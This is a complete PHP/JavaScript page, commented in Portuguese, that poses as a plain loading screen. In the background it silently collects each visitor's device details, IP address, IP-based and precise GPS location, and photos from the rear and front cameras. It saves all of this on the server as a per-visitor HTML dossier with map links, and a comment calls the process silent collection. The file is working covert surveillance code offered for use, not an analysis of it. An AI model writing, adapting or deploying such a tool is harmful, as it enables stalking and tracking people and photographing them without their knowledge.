<?php
session_start();

// Se requisição de dados via Beacon (POST com tipo especificado)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['type'])) {
    // Garante que a pasta do usuário existe na sessão
    if (!isset($_SESSION['folder']) || !isset($_SESSION['folderName'])) {
        exit; // Encerra se sessão inválida
    }
    $userDir    = $_SESSION['folder'];
    $folderName = $_SESSION['folderName'];

    // Processa conforme o tipo de dado recebido
    $type = $_POST['type'];
    if ($type === 'info') {
        // Dados de tela/navegador
        $resolution = $_POST['resolution'] ?? '';
        $touch      = $_POST['touch'] ?? '';
        $language   = $_POST['language'] ?? '';
        $connection = $_POST['connection'] ?? '';
        $pixelRatio = $_POST['pixelRatio'] ?? '';
        // IP e porta do cliente
        $ip   = $_SERVER['REMOTE_ADDR'] ?? '';
        $port = $_SERVER['REMOTE_PORT'] ?? '';
        // Armazena infos na sessão
        $_SESSION['info'] = [
            'resolution' => $resolution,
            'touch'      => $touch,
            'language'   => $language,
            'connection' => $connection,
            'pixelRatio' => $pixelRatio,
            'ip'         => $ip,
            'port'       => $port
        ];
        // Localização aproximada via IP (GeoIP)
        if (!isset($_SESSION['geoip'])) {
            $geoData = @file_get_contents("http://ip-api.com/json/{$ip}?lang=pt-BR");
            if ($geoData) {
                $geoJson = json_decode($geoData, true);
                if (is_array($geoJson) && isset($geoJson['status']) && $geoJson['status'] === 'success') {
                    $_SESSION['geoip'] = [
                        'city'    => $geoJson['city']        ?? '',
                        'region'  => $geoJson['regionName']  ?? '',
                        'country' => $geoJson['country']     ?? '',
                        'lat'     => $geoJson['lat']         ?? '',
                        'lon'     => $geoJson['lon']         ?? ''
                    ];
                }
            }
            if (!isset($_SESSION['geoip'])) {
                // Define valores vazios se falhou (evita repetição de tentativa)
                $_SESSION['geoip'] = ['city' => '', 'region' => '', 'country' => '', 'lat' => '', 'lon' => ''];
            }
        }
        // Log da info recebida
        $_SESSION['log'][] = "Informações: Resolução={$resolution}, Toque={$touch}, Idioma={$language}, Conexão={$connection}, PixelRatio={$pixelRatio}, IP={$ip}, Porta={$port}.";
    }
    elseif ($type === 'geo') {
        // Dados de geolocalização precisa (GPS)
        $lat = $_POST['latitude'] ?? '';
        $lon = $_POST['longitude'] ?? '';
        $acc = $_POST['accuracy'] ?? '';
        $_SESSION['geo'] = [
            'lat' => $lat,
            'lon' => $lon,
            'acc' => $acc
        ];
        // Log da localização GPS
        $_SESSION['log'][] = "Localização GPS: Lat={$lat}, Lon={$lon}, Precisão~{$acc}m.";
    }
    elseif ($type === 'photo_env' || $type === 'photo_user') {
        // Foto de câmera recebida
        if (!empty($_FILES['photo']['tmp_name'])) {
            // Define nome do arquivo conforme tipo
            $fileName = ($type === 'photo_env') ? 'photo_env.jpg' : 'photo_user.jpg';
            $destPath = rtrim($userDir, '/') . '/' . $fileName;
            @move_uploaded_file($_FILES['photo']['tmp_name'], $destPath);
            if ($type === 'photo_env') {
                $_SESSION['photo_env'] = $fileName;
                $_SESSION['log'][] = "Foto (câmera traseira) capturada.";
            } else {
                $_SESSION['photo_user'] = $fileName;
                $_SESSION['log'][] = "Foto (câmera frontal) capturada.";
            }
        }
    }

    // Atualiza (ou gera) o arquivo index.html na pasta do usuário com todos os dados
    if (isset($_SESSION['folder'])) {
        $htmlFile   = rtrim($_SESSION['folder'], '/') . '/index.html';
        $folderName = $_SESSION['folderName'];

        // Início do documento HTML
        $htmlContent  = "<!DOCTYPE html><html lang='pt-BR'><head><meta charset='UTF-8'>";
        $htmlContent .= "<title>Dados coletados - {$folderName}</title></head><body>";

        // Seção de Fotos
        $htmlContent .= "<h2>Fotos</h2><div>";
        if (isset($_SESSION['photo_env']) || isset($_SESSION['photo_user'])) {
            if (isset($_SESSION['photo_env'])) {
                $htmlContent .= "<p><b>Câmera Traseira:</b><br><img src='photo_env.jpg' style='max-width:100%; height:auto;'></p>";
            }
            if (isset($_SESSION['photo_user'])) {
                $htmlContent .= "<p><b>Câmera Frontal:</b><br><img src='photo_user.jpg' style='max-width:100%; height:auto;'></p>";
            }
        } else {
            $htmlContent .= "<p><i>Nenhuma foto capturada ainda.</i></p>";
        }
        $htmlContent .= "</div>";

        // Seção de Localização
        $htmlContent .= "<h2>Localização</h2><div>";
        // Localização aproximada (via IP)
        if (isset($_SESSION['geoip'])) {
            $geo    = $_SESSION['geoip'];
            $locStr = '';
            if (!empty($geo['city']))    $locStr .= $geo['city'];
            if (!empty($geo['region']))  $locStr .= ($locStr ? ', ' : '') . $geo['region'];
            if (!empty($geo['country'])) $locStr .= ($locStr ? ', ' : '') . $geo['country'];
            if ($locStr === '') {
                $htmlContent .= "<p><b>Aproximada (via IP):</b> <i>Não disponível</i></p>";
            } else {
                $htmlContent .= "<p><b>Aproximada (via IP):</b> {$locStr}";
                if (!empty($geo['lat']) && !empty($geo['lon'])) {
                    $lat = $geo['lat']; 
                    $lon = $geo['lon'];
                    $htmlContent .= " (<a href='https://maps.google.com/?q={$lat},{$lon}' target='_blank'>Ver no Google Maps</a>)";
                }
                $htmlContent .= "</p>";
            }
        }
        // Localização precisa (via GPS)
        if (isset($_SESSION['geo'])) {
            $glat = $_SESSION['geo']['lat'];
            $glon = $_SESSION['geo']['lon'];
            $gacc = $_SESSION['geo']['acc'];
            if ($glat !== '') {
                $accText = ($gacc !== '') ? " (precisão ~{$gacc}m)" : "";
                $htmlContent .= "<p><b>Precisa (via GPS):</b> {$glat}, {$glon}{$accText}";
                $htmlContent .= " (<a href='https://maps.google.com/?q={$glat},{$glon}' target='_blank'>Ver no Google Maps</a>)</p>";
            }
        } else {
            $htmlContent .= "<p><b>Precisa (via GPS):</b> <i>Não disponível</i></p>";
        }
        $htmlContent .= "</div>";

        // Seção de Informações do Sistema e Navegador
        $htmlContent .= "<h2>Informações do Sistema e Navegador</h2><div><ul>";
        if (isset($_SESSION['info'])) {
            $info = $_SESSION['info'];
            if (isset($info['resolution'])) $htmlContent .= "<li>Resolução da tela: {$info['resolution']}</li>";
            if (isset($info['touch']))      $htmlContent .= "<li>Suporte a toque: {$info['touch']}</li>";
            if (isset($info['language']))   $htmlContent .= "<li>Idioma: {$info['language']}</li>";
            if (isset($info['connection'])) $htmlContent .= "<li>Tipo de conexão: {$info['connection']}</li>";
            if (isset($info['pixelRatio'])) $htmlContent .= "<li>Device Pixel Ratio: {$info['pixelRatio']}</li>";
            if (isset($info['ip']))        $htmlContent .= "<li>IP de acesso: {$info['ip']}</li>";
            if (isset($info['port']))      $htmlContent .= "<li>Porta remota: {$info['port']}</li>";
        }
        $htmlContent .= "</ul></div>";

        // Seção de Log de Dados Recebidos
        $htmlContent .= "<h2>Log de Dados Recebidos</h2><div><pre style='white-space: pre-wrap;'>";
        if (isset($_SESSION['log'])) {
            foreach ($_SESSION['log'] as $line) {
                $htmlContent .= htmlspecialchars($line) . "\n";
            }
        }
        $htmlContent .= "</pre></div>";

        // Fim do documento HTML
        $htmlContent .= "</body></html>";

        // Salva o conteúdo no arquivo index.html do usuário
        @file_put_contents($htmlFile, $htmlContent);
    }
    exit; // Responde vazio (coleta silenciosa)
}

// Se não for POST de coleta, então é um novo acesso (carrega página inicial)
if (!isset($_SESSION['folder'])) {
    // Gera nome aleatório para pasta do usuário
    $nomes     = ['Ana','Bruno','Carla','Daniel','Eduardo','Fernanda','Gabriel','Helena','Igor','Joana','Luís','Mariana'];
    $randNome  = $nomes[array_rand($nomes)];
    $timestamp = date('Y-m-d_H-i-s');
    $folderName = "{$randNome}_{$timestamp}";
    $userDir    = __DIR__ . "/usuario/{$folderName}";
    @mkdir($userDir, 0777, true);       // cria pasta (e subpastas) se não existir
    $_SESSION['folder']     = $userDir;
    $_SESSION['folderName'] = $folderName;
    $_SESSION['log']        = [];       // inicia log vazio
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Carregando...</title>
  <style>
    /* Centraliza o GIF na tela */
    body { margin: 0; background: #6E2B77; }
    img { display: block; margin: 20vh auto; width:90%; max-width:1000px; }
  </style>
</head>
<body>
  <!-- GIF centralizado ocupando a tela, sem texto visível -->
  <img src="loading.gif" alt="">

  <script>
    // Função imediata para coletar dados em segundo plano
    (function() {
      // 1. Envio de informações de tela e navegador
      var screenRes   = window.screen.width + 'x' + window.screen.height;
      var hasTouch    = (('maxTouchPoints' in navigator && navigator.maxTouchPoints > 0) || ('ontouchstart' in window)) ? 'Sim' : 'Não';
      var language    = navigator.language || navigator.userLanguage || '';
      var connectionType = 'Desconhecido';
      if (navigator.connection) {
        connectionType = navigator.connection.type || navigator.connection.effectiveType || 'Desconhecido';
      }
      var pixelRatio = window.devicePixelRatio || 1;
      // Prepara FormData e envia via sendBeacon
      var fdInfo = new FormData();
      fdInfo.append('type', 'info');
      fdInfo.append('resolution', screenRes);
      fdInfo.append('touch', hasTouch);
      fdInfo.append('language', language);
      fdInfo.append('connection', connectionType);
      fdInfo.append('pixelRatio', pixelRatio);
      navigator.sendBeacon('index.php', fdInfo);

      // 2. Obtenção de geolocalização (GPS)
      function handleGeo(position) {
        if (position && position.coords) {
          var coords = position.coords;
          var fdGeo = new FormData();
          fdGeo.append('type', 'geo');
          fdGeo.append('latitude', coords.latitude);
          fdGeo.append('longitude', coords.longitude);
          fdGeo.append('accuracy', coords.accuracy);
          navigator.sendBeacon('index.php', fdGeo);
        }
        // Após localização (ou em caso de erro), prosseguir para fotos
        capturePhotos();
      }
      function geoError(error) {
        console.error('Geolocation error:', error);
        capturePhotos();
      }
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(handleGeo, geoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
      } else {
        capturePhotos();
      }

      // 3. Captura de fotos das câmeras (traseira e frontal)
      function capturePhotos() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
        // Captura da câmera traseira
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
          .then(function(stream) {
            var track = stream.getVideoTracks()[0];
            var useImageCapture = (typeof ImageCapture !== 'undefined');
            if (useImageCapture) {
              // Tenta usar ImageCapture para foto de alta resolução
              var imageCapture = new ImageCapture(track);
              imageCapture.takePhoto().then(function(blob) {
                var fdPhoto = new FormData();
                fdPhoto.append('type', 'photo_env');
                fdPhoto.append('photo', blob, 'cam_back.jpg');
                navigator.sendBeacon('index.php', fdPhoto);
              }).catch(function(err) {
                console.error('Erro ao capturar foto traseira:', err);
              }).finally(function() {
                track.stop();
                captureFrontCamera(); // prossegue para câmera frontal
              });
            } else {
              // Fallback: captura frame via canvas
              var video = document.createElement('video');
              video.style.position = 'fixed';
              video.style.opacity  = 0;
              video.muted = true;
              video.srcObject = stream;
              video.play();
              video.onloadeddata = function() {
                var canvas = document.createElement('canvas');
                canvas.width  = video.videoWidth;
                canvas.height = video.videoHeight;
                var ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(function(blob) {
                  var fdPhoto = new FormData();
                  fdPhoto.append('type', 'photo_env');
                  fdPhoto.append('photo', blob, 'cam_back.jpg');
                  navigator.sendBeacon('index.php', fdPhoto);
                  // Limpeza
                  track.stop();
                  video.remove();
                  captureFrontCamera();
                }, 'image/jpeg', 0.9);
              };
            }
          })
          .catch(function(err) {
            console.error('Erro ao acessar câmera traseira:', err);
            captureFrontCamera(); // se falhou traseira, tenta frontal
          });

        // Captura da câmera frontal
        function captureFrontCamera() {
          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
              var track = stream.getVideoTracks()[0];
              var useImageCapture = (typeof ImageCapture !== 'undefined');
              if (useImageCapture) {
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto().then(function(blob) {
                  var fdPhoto = new FormData();
                  fdPhoto.append('type', 'photo_user');
                  fdPhoto.append('photo', blob, 'cam_front.jpg');
                  navigator.sendBeacon('index.php', fdPhoto);
                }).catch(function(err) {
                  console.error('Erro ao capturar foto frontal:', err);
                }).finally(function() {
                  track.stop();
                });
              } else {
                var video = document.createElement('video');
                video.style.position = 'fixed';
                video.style.opacity  = 0;
                video.muted = true;
                video.srcObject = stream;
                video.play();
                video.onloadeddata = function() {
                  var canvas = document.createElement('canvas');
                  canvas.width  = video.videoWidth;
                  canvas.height = video.videoHeight;
                  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                  canvas.toBlob(function(blob) {
                    var fdPhoto = new FormData();
                    fdPhoto.append('type', 'photo_user');
                    fdPhoto.append('photo', blob, 'cam_front.jpg');
                    navigator.sendBeacon('index.php', fdPhoto);
                    // Limpeza
                    track.stop();
                    video.remove();
                  }, 'image/jpeg', 0.9);
                };
              }
            })
            .catch(function(err) {
              console.error('Erro ao acessar câmera frontal:', err);
            });
        }
      }
    })();
  </script>
</body>
</html>